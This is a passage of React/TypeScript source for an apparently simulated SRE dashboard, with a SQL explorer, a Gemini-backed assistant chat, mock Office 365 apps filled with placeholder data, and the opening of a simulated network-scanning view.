                  <ChevronRight className="w-4 h-4 text-slate-400" />
                  <Database className="w-4 h-4 text-red-600" />
                  PRODUTOS
                </div>
                <div className="pl-6 space-y-2">
                  <div className="flex items-center gap-2 text-sm text-slate-600 hover:text-red-600 cursor-pointer">
                    <ChevronRight className="w-4 h-4 text-slate-300" />
                    <Table className="w-3.5 h-3.5" />
                    Tables
                  </div>
                  <div className="pl-6 space-y-1.5 border-l border-slate-100 ml-1.5">
                    {['plantas', 'arvores', 'jardinagem', 'sementes'].map(table => (
                      <div key={table} className="text-xs text-slate-500 hover:text-red-600 cursor-pointer flex items-center gap-2">
                        <Table className="w-3 h-3 opacity-50" />
                        {table.toUpperCase()}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* CLIENTES Schema */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                  <ChevronRight className="w-4 h-4 text-slate-400" />
                  <Database className="w-4 h-4 text-blue-600" />
                  CLIENTES
                </div>
                <div className="pl-6 space-y-2">
                  <div className="flex items-center gap-2 text-sm text-slate-600 hover:text-blue-600 cursor-pointer">
                    <ChevronRight className="w-4 h-4 text-slate-300" />
                    <Table className="w-3.5 h-3.5" />
                    Tables
                  </div>
                  <div className="pl-6 space-y-1.5 border-l border-slate-100 ml-1.5">
                    {['clientes', 'empresas'].map(table => (
                      <div key={table} className="text-xs text-slate-500 hover:text-blue-600 cursor-pointer flex items-center gap-2">
                        <Table className="w-3 h-3 opacity-50" />
                        {table.toUpperCase()}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* MVS Schema */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                  <ChevronRight className="w-4 h-4 text-slate-400" />
                  <Database className="w-4 h-4 text-purple-600" />
                  MATERIALIZED VIEWS (MVS)
                </div>
                <div className="pl-6 space-y-2">
                  <div className="flex items-center gap-2 text-sm text-slate-600 hover:text-purple-600 cursor-pointer">
                    <ChevronRight className="w-4 h-4 text-slate-300" />
                    <Layers className="w-3.5 h-3.5" />
                    Views
                  </div>
                  <div className="pl-6 space-y-1.5 border-l border-slate-100 ml-1.5">
                    {['MV_VENDAS_POR_CATEGORIA', 'MV_TOP_CLIENTES'].map(view => (
                      <div key={view} className="text-[10px] text-slate-500 hover:text-purple-600 cursor-pointer flex items-center gap-2">
                        <Layers className="w-3 h-3 opacity-50" />
                        {view}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* EQUIPAS Schema */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                  <ChevronRight className="w-4 h-4 text-slate-400" />
                  <Database className="w-4 h-4 text-green-600" />
                  EQUIPAS
                </div>
                <div className="pl-6 space-y-2">
                  <div className="flex items-center gap-2 text-sm text-slate-600 hover:text-green-600 cursor-pointer">
                    <ChevronRight className="w-4 h-4 text-slate-300" />
                    <Table className="w-3.5 h-3.5" />
                    Tables
                  </div>
                  <div className="pl-6 space-y-1.5 border-l border-slate-100 ml-1.5">
                    {['CloudEnginners', 'DevOps', 'ApplicationSupportEng'].map(table => (
                      <div key={table} className="text-xs text-slate-500 hover:text-green-600 cursor-pointer flex items-center gap-2">
                        <Table className="w-3 h-3 opacity-50" />
                        {table.toUpperCase()}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </ScrollArea>
        </Card>

        {/* Editor & Results */}
        <div className="lg:col-span-3 flex flex-col gap-6 min-h-0">
          {/* SQL Editor */}
          <Card className="border-slate-100 shadow-sm overflow-hidden">
            <div className="flex items-center gap-4 px-4 py-2 bg-slate-50 border-b border-slate-100">
              <div className="flex items-center gap-1">
                <div className="w-2 h-2 rounded-full bg-red-500" />
                <span className="text-[10px] font-bold text-slate-400 uppercase">Query 1</span>
              </div>
              <Separator orientation="vertical" className="h-4" />
              <span className="text-xs font-mono text-slate-400">worksheet.sql</span>
            </div>
            <textarea
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              className="w-full h-48 p-6 font-mono text-sm bg-slate-950 text-green-400 focus:outline-none resize-none"
              spellCheck={false}
            />
          </Card>

          {/* Results */}
          <Card className="flex-1 border-slate-100 shadow-sm overflow-hidden flex flex-col min-h-0">
            <div className="px-4 py-2 bg-slate-50 border-b border-slate-100 flex items-center justify-between">
              <div className="flex items-center gap-4">
                <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">Query Result</span>
                {results.length > 0 && (
                  <Badge variant="secondary" className="text-[10px] bg-green-100 text-green-700 border-none">
                    {results.length} rows returned
                  </Badge>
                )}
              </div>
              <div className="flex items-center gap-2">
                <Button variant="ghost" size="icon" className="h-7 w-7 text-slate-400">
                  <Download className="w-4 h-4" />
                </Button>
                <Button variant="ghost" size="icon" className="h-7 w-7 text-slate-400">
                  <Filter className="w-4 h-4" />
                </Button>
              </div>
            </div>
            
            <ScrollArea className="flex-1">
              {error ? (
                <div className="p-8 flex flex-col items-center justify-center text-red-500 gap-3">
                  <AlertCircle className="w-8 h-8 opacity-50" />
                  <p className="font-mono text-sm">{error}</p>
                </div>
              ) : results.length > 0 ? (
                <div className="min-w-full inline-block align-middle">
                  <table className="min-w-full divide-y divide-slate-100">
                    <thead className="bg-slate-50/50 sticky top-0">
                      <tr>
                        {Object.keys(results[0]).map(key => (
                          <th key={key} className="px-4 py-3 text-left text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                            {key}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-100 bg-white">
                      {results.map((row, i) => (
                        <tr key={i} className="hover:bg-slate-50 transition-colors">
                          {Object.values(row).map((val: any, j) => (
                            <td key={j} className="px-4 py-3 text-xs text-slate-600 font-mono">
                              {typeof val === 'number' ? val.toFixed(2) : String(val)}
                            </td>
                          ))}
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="h-full flex flex-col items-center justify-center text-slate-400 gap-4 p-12">
                  <div className="w-16 h-16 rounded-full bg-slate-50 flex items-center justify-center">
                    <TerminalIcon className="w-8 h-8 opacity-20" />
                  </div>
                  <div className="text-center">
                    <p className="font-bold text-slate-500">No results to display</p>
                    <p className="text-xs">Execute a query to see data here.</p>
                  </div>
                </div>
              )}
            </ScrollArea>
          </Card>
        </div>
      </div>
    </div>
  );
};

const AIView = () => {
  const [prompt, setPrompt] = useState('');
  const [response, setResponse] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [chatHistory, setChatHistory] = useState<{ role: 'user' | 'ai', text: string }[]>([]);

  const handleAskAI = async () => {
    if (!prompt.trim()) return;
    
    const userMsg = prompt;
    setPrompt('');
    setChatHistory(prev => [...prev, { role: 'user', text: userMsg }]);
    setIsLoading(true);

    try {
      const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
      const result = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: userMsg,
        config: {
          systemInstruction: "Você é um assistente especializado em SRE (Site Reliability Engineering) e DevOps. Ajude o usuário com problemas de infraestrutura, automação, monitoramento e incidentes de TI. Seja técnico, preciso e prestativo.",
        }
      });
      
      const aiText = result.text || "Desculpe, não consegui gerar uma resposta.";
      setChatHistory(prev => [...prev, { role: 'ai', text: aiText }]);
    } catch (error) {
      console.error("AI Error:", error);
      setChatHistory(prev => [...prev, { role: 'ai', text: "Erro ao conectar com a inteligência artificial. Verifique sua conexão ou chave de API." }]);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex flex-col h-full max-w-4xl mx-auto space-y-6">
      <div className="flex items-center gap-4 mb-4">
        <div className="p-3 bg-yellow-400 rounded-2xl shadow-lg shadow-yellow-100">
          <Zap className="w-8 h-8 text-slate-900" />
        </div>
        <div>
          <h1 className="text-3xl font-black text-slate-900 tracking-tight">SRE AI Assistant</h1>
          <p className="text-slate-500 font-medium">Powered by Gemini - Especialista em Infraestrutura</p>
        </div>
      </div>

      <Card className="flex-1 flex flex-col rounded-3xl border-2 border-slate-100 shadow-sm overflow-hidden bg-slate-50/30">
        <ScrollArea className="h-full p-6">
          <div className="space-y-6">
            {chatHistory.length === 0 && (
              <div className="text-center py-12 space-y-4">
                <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto shadow-sm border border-slate-100">
                  <MessageSquare className="w-8 h-8 text-slate-300" />
                </div>
                <div className="max-w-xs mx-auto">
                  <p className="text-slate-900 font-bold">Como posso ajudar hoje?</p>
                  <p className="text-slate-500 text-sm">Pergunte sobre Kubernetes, Terraform, incidentes ou automação.</p>
                </div>
                <div className="grid grid-cols-2 gap-3 max-w-md mx-auto mt-8">
                  {[
                    "Como debugar um CrashLoopBackOff?",
                    "Explique o conceito de Error Budgets",
                    "Crie um script Terraform para S3",
                    "Melhores práticas de Nginx"
                  ].map(suggestion => (
                    <button 
                      key={suggestion}
                      onClick={() => setPrompt(suggestion)}
                      className="text-left p-3 bg-white border border-slate-100 rounded-xl text-xs font-medium hover:border-yellow-400 hover:bg-yellow-50 transition-all"
                    >
                      {suggestion}
                    </button>
                  ))}
                </div>
              </div>
            )}
            {chatHistory.map((msg, i) => (
              <div key={i} className={cn(
                "flex gap-4",
                msg.role === 'user' ? "flex-row-reverse" : ""
              )}>
                <Avatar className={cn(
                  "w-10 h-10 border-2",
                  msg.role === 'user' ? "border-slate-200" : "border-yellow-400"
                )}>
                  <AvatarFallback className={msg.role === 'user' ? "bg-slate-100" : "bg-yellow-400 text-slate-900 font-bold"}>
                    {msg.role === 'user' ? 'U' : 'AI'}
                  </AvatarFallback>
                </Avatar>
                <div className={cn(
                  "max-w-[80%] p-4 rounded-2xl text-sm leading-relaxed shadow-sm",
                  msg.role === 'user' 
                    ? "bg-slate-900 text-white rounded-tr-none" 
                    : "bg-white text-slate-800 border border-slate-100 rounded-tl-none"
                )}>
                  {msg.role === 'ai' ? (
                    <div className="markdown-content">
                      <ReactMarkdown remarkPlugins={[remarkGfm]}>
                        {msg.text}
                      </ReactMarkdown>
                    </div>
                  ) : (
                    msg.text
                  )}
                </div>
              </div>
            ))}
            {isLoading && (
              <div className="flex gap-4">
                <Avatar className="w-10 h-10 border-2 border-yellow-400 animate-pulse">
                  <AvatarFallback className="bg-yellow-400 text-slate-900 font-bold">AI</AvatarFallback>
                </Avatar>
                <div className="bg-white p-4 rounded-2xl rounded-tl-none border border-slate-100 shadow-sm">
                  <div className="flex gap-1">
                    <span className="w-1.5 h-1.5 bg-slate-300 rounded-full animate-bounce" />
                    <span className="w-1.5 h-1.5 bg-slate-300 rounded-full animate-bounce [animation-delay:0.2s]" />
                    <span className="w-1.5 h-1.5 bg-slate-300 rounded-full animate-bounce [animation-delay:0.4s]" />
                  </div>
                </div>
              </div>
            )}
          </div>
        </ScrollArea>
        
        <div className="p-6 bg-white border-t border-slate-100">
          <div className="relative">
            <textarea 
              value={prompt}
              onChange={(e) => setPrompt(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && !e.shiftKey) {
                  e.preventDefault();
                  handleAskAI();
                }
              }}
              placeholder="Digite sua dúvida técnica aqui..."
              className="w-full min-h-[100px] p-4 bg-slate-50 border border-slate-200 rounded-2xl focus:ring-2 focus:ring-yellow-400 focus:border-transparent outline-none transition-all resize-none text-sm"
            />
            <Button 
              onClick={handleAskAI}
              disabled={isLoading || !prompt.trim()}
              className="absolute bottom-4 right-4 bg-yellow-400 hover:bg-yellow-500 text-slate-900 font-bold rounded-xl px-6"
            >
              <Send className="w-4 h-4 mr-2" />
              Enviar
            </Button>
          </div>
          <p className="text-[10px] text-slate-400 mt-3 text-center">
            O AI Assistant pode cometer erros. Verifique informações críticas.
          </p>
        </div>
      </Card>
    </div>
  );
};

const WordSimulation = () => {
  const [content, setContent] = useState('Relatório de Infraestrutura SRE\n\nEste documento detalha o estado atual dos clusters Kubernetes e as métricas de latência observadas no último trimestre.\n\n1. Resumo Executivo\nOs sistemas estão operando com 99.9% de uptime...\n\n2. Pontos de Atenção\n- Latência no banco de dados Oracle\n- Consumo de memória no cluster de produção');
  
  return (
    <div className="flex flex-col h-full bg-[#f3f2f1]">
      {/* Word Toolbar */}
      <div className="bg-white border-b border-slate-200 p-2 flex items-center gap-4 shrink-0">
        <div className="flex items-center gap-1 border-r pr-4">
          <Button variant="ghost" size="icon" className="h-8 w-8"><Bold className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8"><Italic className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8"><Underline className="w-4 h-4" /></Button>
        </div>
        <div className="flex items-center gap-1 border-r pr-4">
          <Button variant="ghost" size="icon" className="h-8 w-8"><AlignLeft className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8"><AlignCenter className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8"><AlignRight className="w-4 h-4" /></Button>
        </div>
        <div className="flex items-center gap-1">
          <Button variant="ghost" size="icon" className="h-8 w-8"><List className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8 text-blue-600"><Save className="w-4 h-4" /></Button>
        </div>
      </div>
      
      {/* Word Page */}
      <ScrollArea className="flex-1 p-12">
        <div className="max-w-[816px] mx-auto bg-white shadow-lg min-h-[1056px] p-16 focus-within:ring-2 ring-blue-400 transition-all">
          <textarea 
            value={content}
            onChange={(e) => setContent(e.target.value)}
            className="w-full h-full min-h-[900px] border-none outline-none resize-none font-serif text-lg leading-relaxed text-slate-800"
            placeholder="Comece a escrever seu documento..."
          />
        </div>
      </ScrollArea>
      
      {/* Status Bar */}
      <div className="bg-[#2b579a] text-white px-4 py-1 text-[10px] flex justify-between shrink-0">
        <div className="flex gap-4">
          <span>Página 1 de 1</span>
          <span>{content.split(/\s+/).filter(x => x).length} palavras</span>
        </div>
        <span>Português (Brasil)</span>
      </div>
    </div>
  );
};

const ExcelSimulation = () => {
  const [cells, setCells] = useState<Record<string, string>>({
    'A1': 'ID', 'B1': 'Sistema', 'C1': 'Status', 'D1': 'Uptime',
    'A2': '101', 'B2': 'Oracle DB', 'C2': 'Online', 'D2': '99.8%',
    'A3': '102', 'B3': 'SAP ERP', 'C3': 'Online', 'D3': '99.5%',
    'A4': '103', 'B4': 'Portal Web', 'C4': 'Degraded', 'D4': '94.2%',
    'A5': '104', 'B5': 'EDI Gateway', 'C5': 'Online', 'D5': '99.9%',
  });
  
  const [selectedCell, setSelectedCell] = useState('A1');
  
  const columns = ['A', 'B', 'C', 'D', 'E', 'F', 'G'];
  const rows = Array.from({ length: 15 }, (_, i) => i + 1);

  return (
    <div className="flex flex-col h-full bg-[#f3f2f1]">
      {/* Excel Toolbar */}
      <div className="bg-white border-b border-slate-200 p-2 flex items-center gap-4 shrink-0">
        <div className="flex items-center gap-1 border-r pr-4">
          <Button variant="ghost" size="icon" className="h-8 w-8"><Bold className="w-4 h-4" /></Button>
          <Button variant="ghost" size="icon" className="h-8 w-8"><Table className="w-4 h-4" /></Button>
        </div>
        <div className="flex items-center gap-2 flex-1">
          <div className="bg-slate-100 px-2 py-1 rounded text-xs font-bold w-10 text-center border">{selectedCell}</div>
          <div className="flex-1 bg-white border rounded px-3 py-1 text-sm flex items-center gap-2">
            <span className="italic text-slate-400 font-serif">fx</span>
            <input 
              value={cells[selectedCell] || ''}
              onChange={(e) => setCells(prev => ({ ...prev, [selectedCell]: e.target.value }))}
              className="flex-1 outline-none bg-transparent"
            />
          </div>
        </div>
      </div>
      
      {/* Excel Grid */}
      <div className="flex-1 overflow-auto custom-scrollbar bg-white">
        <table className="border-collapse w-full table-fixed">
          <thead>
            <tr>
              <th className="w-10 bg-slate-100 border border-slate-200"></th>
              {columns.map(col => (
                <th key={col} className="bg-slate-100 border border-slate-200 text-[10px] font-bold py-1 text-slate-500">{col}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {rows.map(row => (
              <tr key={row}>
                <td className="bg-slate-100 border border-slate-200 text-[10px] font-bold text-center text-slate-500">{row}</td>
                {columns.map(col => {
                  const id = `${col}${row}`;
                  return (
                    <td 
                      key={id} 
                      className={cn(
                        "border border-slate-200 p-0 relative",
                        selectedCell === id ? "ring-2 ring-green-600 z-10" : ""
                      )}
                      onClick={() => setSelectedCell(id)}
                    >
                      <input 
                        value={cells[id] || ''}
                        onChange={(e) => setCells(prev => ({ ...prev, [id]: e.target.value }))}
                        className="w-full h-full px-2 py-1 text-xs outline-none border-none"
                      />
                    </td>
                  );
                })}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      
      {/* Sheet Tabs */}
      <div className="bg-[#217346] text-white px-4 py-1 text-[10px] flex items-center gap-4 shrink-0">
        <div className="bg-white text-[#217346] px-3 py-1 font-bold rounded-t-sm">Planilha1</div>
        <div className="hover:bg-white/10 px-3 py-1 cursor-pointer">Planilha2</div>
        <Plus className="w-3 h-3 cursor-pointer" />
      </div>
    </div>
  );
};

const OneNoteSimulation = () => {
  const [activeSection, setActiveSection] = useState('SRE');
  const [activePage, setActivePage] = useState('Incidentes');
  const [note, setNote] = useState('Lembrete: Verificar os logs do cluster de Lisboa amanhã cedo.\n\n- O erro 503 persiste no portal.\n- A equipe de DB já foi notificada.\n- Próxima reunião: 14:00.');

  const sections = ['SRE', 'Projetos', 'Pessoal', 'Arquivo'];
  const pages: Record<string, string[]> = {
    'SRE': ['Incidentes', 'Métricas', 'On-call'],
    'Projetos': ['Portal Jardinagem', 'Migração AWS', 'SAP Update'],
    'Pessoal': ['Metas', 'Treinamentos'],
    'Arquivo': ['2023 Logs']
  };

  return (
    <div className="flex h-full bg-white">
      {/* Sections */}
      <div className="w-48 bg-[#f3f2f1] border-r border-slate-200 flex flex-col">
        <div className="p-4 font-bold text-[#7719aa] text-sm border-b">Seções</div>
        <ScrollArea className="flex-1">
          {sections.map(s => (
            <button 
              key={s}
              onClick={() => { setActiveSection(s); setActivePage(pages[s][0]); }}
              className={cn(
                "w-full text-left px-4 py-2 text-xs font-medium transition-all border-l-4",
                activeSection === s ? "bg-white border-[#7719aa] text-[#7719aa]" : "border-transparent text-slate-600 hover:bg-slate-200"
              )}
            >
              {s}
            </button>
          ))}
        </ScrollArea>
      </div>
      
      {/* Pages */}
      <div className="w-56 bg-slate-50 border-r border-slate-200 flex flex-col">
        <div className="p-4 font-bold text-slate-900 text-sm border-b">Páginas</div>
        <ScrollArea className="flex-1">
          {pages[activeSection].map(p => (
            <button 
              key={p}
              onClick={() => setActivePage(p)}
              className={cn(
                "w-full text-left px-4 py-2 text-xs transition-all",
                activePage === p ? "bg-white text-blue-600 font-bold" : "text-slate-600 hover:bg-slate-100"
              )}
            >
              {p}
            </button>
          ))}
        </ScrollArea>
      </div>
      
      {/* Content */}
      <div className="flex-1 flex flex-col">
        <div className="p-8 border-b">
          <h3 className="text-2xl font-bold text-slate-900">{activePage}</h3>
          <p className="text-xs text-slate-400 mt-1">terça-feira, 14 de abril de 2026 • 09:15</p>
        </div>
        <textarea 
          value={note}
          onChange={(e) => setNote(e.target.value)}
          className="flex-1 p-8 outline-none resize-none font-sans text-sm leading-relaxed text-slate-800"
          placeholder="Comece a digitar sua nota aqui..."
        />
      </div>
    </div>
  );
};

const EmailSimulation = () => {
  const [selectedEmail, setSelectedEmail] = useState(1);
  const [isComposing, setIsComposing] = useState(false);
  
  const emails = [
    { id: 1, from: 'Cristiano Ronaldo', subject: 'SAP Integration fixed', preview: 'The latency issue is resolved. Please check...', time: '10:45 AM', body: 'Olá Pedro,\n\nConsegui resolver o problema de integração com o SAP. O problema era um timeout no gateway de EDI.\n\nAbraço,\nCR7' },
    { id: 2, from: 'Lionel Messi', subject: 'Database clusters check', preview: 'I am checking the database clusters now...', time: '10:47 AM', body: 'Pedro,\n\nEstou a verificar os clusters de base de dados para garantir que a replicação está a funcionar corretamente.\n\nCumprimentos,\nMessi' },
    { id: 3, from: 'Zinedine Zidane', subject: 'Load balancer spike', preview: 'Keep an eye on the load balancer. Traffic is...', time: '10:50 AM', body: 'Equipa,\n\nEstamos a notar um pico de tráfego. Por favor, monitorizem os load balancers.\n\nZizou' },
  ];

  const currentEmail = emails.find(e => e.id === selectedEmail);

  return (
    <div className="flex h-full bg-white">
      {/* Outlook Sidebar */}
      <div className="w-64 border-r border-slate-200 flex flex-col bg-[#f3f2f1]">
        <div className="p-4">
          <Button 
            onClick={() => setIsComposing(true)}
            className="w-full bg-[#0078d4] hover:bg-[#005a9e] text-white rounded-md font-bold"
          >
            <Plus className="w-4 h-4 mr-2" /> Novo Email
          </Button>
        </div>
        <ScrollArea className="flex-1">
          <div className="px-2 space-y-1">
            <div className="p-2 text-[10px] font-bold text-slate-400 uppercase">Favoritos</div>
            <button className="w-full text-left px-3 py-2 text-xs bg-white rounded border border-slate-200 font-bold text-[#0078d4] flex items-center gap-2">
              <Mail className="w-3 h-3" /> Caixa de Entrada
            </button>
            <button className="w-full text-left px-3 py-2 text-xs hover:bg-slate-200 rounded flex items-center gap-2">
              <Send className="w-3 h-3" /> Itens Enviados
            </button>
            <button className="w-full text-left px-3 py-2 text-xs hover:bg-slate-200 rounded flex items-center gap-2">
              <FileText className="w-3 h-3" /> Rascunhos
            </button>
          </div>
        </ScrollArea>
      </div>
      
      {/* Email List */}
      <div className="w-80 border-r border-slate-200 flex flex-col">
        <div className="p-4 border-b flex items-center justify-between">
          <h3 className="font-bold text-sm">Caixa de Entrada</h3>
          <Filter className="w-4 h-4 text-slate-400" />
        </div>
        <ScrollArea className="flex-1">
          {emails.map(e => (
            <button 
              key={e.id}
              onClick={() => { setSelectedEmail(e.id); setIsComposing(false); }}
              className={cn(
                "w-full text-left p-4 border-b transition-all hover:bg-slate-50",
                selectedEmail === e.id && !isComposing ? "bg-blue-50 border-l-4 border-l-[#0078d4]" : "border-l-4 border-l-transparent"
              )}
            >
              <div className="flex justify-between items-start mb-1">
                <span className="font-bold text-sm text-slate-900">{e.from}</span>
                <span className="text-[10px] text-slate-400">{e.time}</span>
              </div>
              <p className="text-xs font-bold text-[#0078d4] mb-1">{e.subject}</p>
              <p className="text-xs text-slate-500 line-clamp-1">{e.preview}</p>
            </button>
          ))}
        </ScrollArea>
      </div>
      
      {/* Email Content */}
      <div className="flex-1 flex flex-col bg-white">
        {isComposing ? (
          <div className="flex flex-col h-full">
            <div className="p-4 border-b flex items-center justify-between bg-slate-50">
              <div className="flex gap-2">
                <Button size="sm" className="bg-[#0078d4] text-white">Enviar</Button>
                <Button size="sm" variant="outline" onClick={() => setIsComposing(false)}>Descartar</Button>
              </div>
            </div>
            <div className="p-6 space-y-4">
              <div className="flex items-center gap-4 border-b pb-2">
                <span className="text-sm text-slate-400 w-12">Para:</span>
                <input className="flex-1 outline-none text-sm" placeholder="exemplo@empresa.com" />
              </div>
              <div className="flex items-center gap-4 border-b pb-2">
                <span className="text-sm text-slate-400 w-12">Assunto:</span>
                <input className="flex-1 outline-none text-sm" placeholder="Assunto do email" />
              </div>
              <textarea 
                className="w-full flex-1 min-h-[400px] outline-none resize-none text-sm leading-relaxed"
                placeholder="Escreva sua mensagem aqui..."
              />
            </div>
          </div>
        ) : currentEmail ? (
          <div className="flex flex-col h-full">
            <div className="p-6 border-b">
              <h2 className="text-xl font-bold text-slate-900 mb-4">{currentEmail.subject}</h2>
              <div className="flex items-center gap-3">
                <Avatar className="w-10 h-10">
                  <AvatarFallback className="bg-[#0078d4] text-white">{currentEmail.from[0]}</AvatarFallback>
                </Avatar>
                <div>
                  <p className="text-sm font-bold">{currentEmail.from}</p>
                  <p className="text-xs text-slate-400">Para: Você • {currentEmail.time}</p>
                </div>
              </div>
            </div>
            <ScrollArea className="flex-1 p-8">
              <div className="text-sm leading-relaxed text-slate-800 whitespace-pre-wrap">
                {currentEmail.body}
              </div>
            </ScrollArea>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center text-slate-400 flex-col gap-4">
            <Mail className="w-12 h-12 opacity-20" />
            <p>Selecione um email para ler</p>
          </div>
        )}
      </div>
    </div>
  );
};

const VisioSimulation = () => {
  const initialNodes: Node[] = [
    { 
      id: '1', 
      position: { x: 250, y: 50 }, 
      data: { label: 'Load Balancer' }, 
      style: { background: '#0078d4', color: '#fff', borderRadius: '8px', fontWeight: 'bold', border: 'none' } 
    },
    { 
      id: '2', 
      position: { x: 100, y: 150 }, 
      data: { label: 'Web Server 1' },
      style: { background: '#f3f2f1', borderRadius: '8px', border: '1px solid #0078d4' }
    },
    { 
      id: '3', 
      position: { x: 400, y: 150 }, 
      data: { label: 'Web Server 2' },
      style: { background: '#f3f2f1', borderRadius: '8px', border: '1px solid #0078d4' }
    },
    { 
      id: '4', 
      position: { x: 250, y: 250 }, 
      data: { label: 'Database Cluster' },
      style: { background: '#217346', color: '#fff', borderRadius: '8px', fontWeight: 'bold', border: 'none' }
    },
  ];

  const initialEdges: Edge[] = [
    { id: 'e1-2', source: '1', target: '2', animated: true },
    { id: 'e1-3', source: '1', target: '3', animated: true },
    { id: 'e2-4', source: '2', target: '4' },
    { id: 'e3-4', source: '3', target: '4' },
  ];

  const [nodes, setNodes, onNodesChange] = useNodesState(initialNodes);
  const [edges, setEdges, onEdgesChange] = useEdgesState(initialEdges);

  const onConnect = (params: Connection) => setEdges((eds) => addEdge(params, eds));

  const addNode = (type: string) => {
    const id = `${nodes.length + 1}`;
    const newNode: Node = {
      id,
      position: { x: Math.random() * 400, y: Math.random() * 400 },
      data: { label: type },
      style: { 
        background: type === 'Database' ? '#217346' : (type === 'Server' ? '#f3f2f1' : '#0078d4'),
        color: type === 'Server' ? '#000' : '#fff',
        borderRadius: '8px',
        border: type === 'Server' ? '1px solid #0078d4' : 'none',
        padding: '10px'
      }
    };
    setNodes((nds) => nds.concat(newNode));
  };

  return (
    <div className="h-full flex flex-col bg-white">
      <div className="bg-slate-50 border-b p-2 flex items-center justify-between">
        <div className="flex gap-2">
          <Button size="sm" variant="outline" onClick={() => addNode('Server')} className="gap-2">
            <Server className="w-4 h-4" /> Add Server
          </Button>
          <Button size="sm" variant="outline" onClick={() => addNode('Database')} className="gap-2">
            <Database className="w-4 h-4" /> Add DB
          </Button>
          <Button size="sm" variant="outline" onClick={() => addNode('Cloud')} className="gap-2">
            <Cloud className="w-4 h-4" /> Add Cloud
          </Button>
        </div>
        <div className="flex gap-2">
          <Button size="sm" variant="ghost" className="text-slate-400">
            <Share2 className="w-4 h-4 mr-2" /> Share
          </Button>
          <Button size="sm" variant="ghost" className="text-slate-400">
            <Download className="w-4 h-4 mr-2" /> Export
          </Button>
        </div>
      </div>
      <div className="flex-1 relative">
        <ReactFlow
          nodes={nodes}
          edges={edges}
          onNodesChange={onNodesChange}
          onEdgesChange={onEdgesChange}
          onConnect={onConnect}
          fitView
        >
          <Background />
          <Controls />
          <MiniMap />
          <Panel position="top-right" className="bg-white/80 p-2 rounded-lg border shadow-sm backdrop-blur-sm">
            <p className="text-[10px] font-bold text-slate-500 uppercase">Visio Online</p>
          </Panel>
        </ReactFlow>
      </div>
    </div>
  );
};

const Office365View = () => {
  const [activeApp, setActiveApp] = useState<'word' | 'excel' | 'onenote' | 'email' | 'visio'>('word');

  return (
    <div className="flex flex-col h-full bg-white rounded-3xl border-2 border-slate-100 overflow-hidden shadow-xl">
      {/* Office 365 Ribbon/Header */}
      <div className="bg-[#d83b01] text-white px-6 py-3 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-4">
          <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center">
             <Grid className="w-5 h-5 text-[#d83b01]" />
          </div>
          <h2 className="text-lg font-bold">Microsoft 365</h2>
        </div>
        <div className="flex gap-1">
          <button 
            onClick={() => setActiveApp('word')}
            className={cn(
              "px-4 py-1 rounded-md text-sm font-medium transition-all",
              activeApp === 'word' ? "bg-white text-[#d83b01]" : "text-white hover:bg-white/10"
            )}
          >
            Word
          </button>
          <button 
            onClick={() => setActiveApp('excel')}
            className={cn(
              "px-4 py-1 rounded-md text-sm font-medium transition-all",
              activeApp === 'excel' ? "bg-white text-[#217346]" : "text-white hover:bg-white/10"
            )}
          >
            Excel
          </button>
          <button 
            onClick={() => setActiveApp('visio')}
            className={cn(
              "px-4 py-1 rounded-md text-sm font-medium transition-all",
              activeApp === 'visio' ? "bg-white text-[#323130]" : "text-white hover:bg-white/10"
            )}
          >
            Visio
          </button>
          <button 
            onClick={() => setActiveApp('onenote')}
            className={cn(
              "px-4 py-1 rounded-md text-sm font-medium transition-all",
              activeApp === 'onenote' ? "bg-white text-[#7719aa]" : "text-white hover:bg-white/10"
            )}
          >
            OneNote
          </button>
          <button 
            onClick={() => setActiveApp('email')}
            className={cn(
              "px-4 py-1 rounded-md text-sm font-medium transition-all",
              activeApp === 'email' ? "bg-white text-[#0078d4]" : "text-white hover:bg-white/10"
            )}
          >
            Outlook
          </button>
        </div>
      </div>

      <div className="flex-1 overflow-hidden">
        {activeApp === 'word' && <WordSimulation />}
        {activeApp === 'excel' && <ExcelSimulation />}
        {activeApp === 'visio' && <VisioSimulation />}
        {activeApp === 'onenote' && <OneNoteSimulation />}
        {activeApp === 'email' && <EmailSimulation />}
      </div>
    </div>
  );
};

const CybersecurityView = () => {
  const [selectedTool, setSelectedTool] = useState('nmap');
  const [nmapTarget, setNmapTarget] = useState('192.168.1.105');
  const [isScanning, setIsScanning] = useState(false);
  const [scanResults, setScanResults] = useState<string[]>([]);

  const [wiresharkPackets, setWiresharkPackets] = useState([
    { id: 1, time: '0.000000', source: '192.168.1.105', dest: '8.8.8.8', proto: 'DNS', length: 74, info: 'Standard query 0x1234 A google.com' },
    { id: 2, time: '0.012450', source: '8.8.8.8', dest: '192.168.1.105', proto: 'DNS', length: 90, info: 'Standard query response 0x1234 A 142.250.184.206' },
